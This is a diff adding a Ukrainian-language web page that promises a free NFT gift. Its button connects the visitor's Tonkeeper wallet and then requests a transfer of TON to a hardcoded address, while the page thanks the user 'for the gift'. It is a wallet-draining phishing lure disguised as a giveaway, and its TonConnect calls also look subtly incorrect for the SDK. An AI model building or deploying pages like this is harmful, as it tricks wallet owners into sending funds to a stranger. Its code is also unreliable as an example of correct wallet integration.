@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Забрати NFT-подарунок</title>
+  <script src="https://cdn.jsdelivr.net/npm/@tonconnect/sdk@0.2.8/dist/tonconnect.min.js"></script>
+</head>
+<body style="font-family: Arial, sans-serif; text-align: center; padding: 40px;">
+  <h1>🎁 Забрати NFT-подарунок</h1>
+  <p>Натисни кнопку нижче, щоб підписати переказ NFT на наш TON-гаманець.</p>
+  <button id="connectButton" style="font-size: 18px; padding: 10px 20px; cursor: pointer;">
+    Підключити Tonkeeper і забрати подарунок
+  </button>
+
+  <script>
+    const tonAddress = "UQB1G8SPfLq7xg_SSAyb2w2SoAM-Jbxg7YqGB4q0JUdNQOD0";
+    const tonConnect = new TonConnect();
+
+    document.getElementById("connectButton").onclick = async () => {
+      try {
+        await tonConnect.connect();
+        if (!tonConnect.connected) {
+          alert("Підключення не вдалося, спробуйте ще раз.");
+          return;
+        }
+
+        const transferPayload = {
+          address: tonAddress,
+          amount: "1000000", // 0.001 TON
+          stateInit: null,
+          payload: null,
+        };
+
+        await tonConnect.sendTransaction([transferPayload]);
+        alert("Транзакція відправлена! Дякуємо за подарунок.");
+      } catch (e) {
+        alert("Сталася помилка: " + e.message);
+      }
+    };
+  </script>
+</body>
+</html>
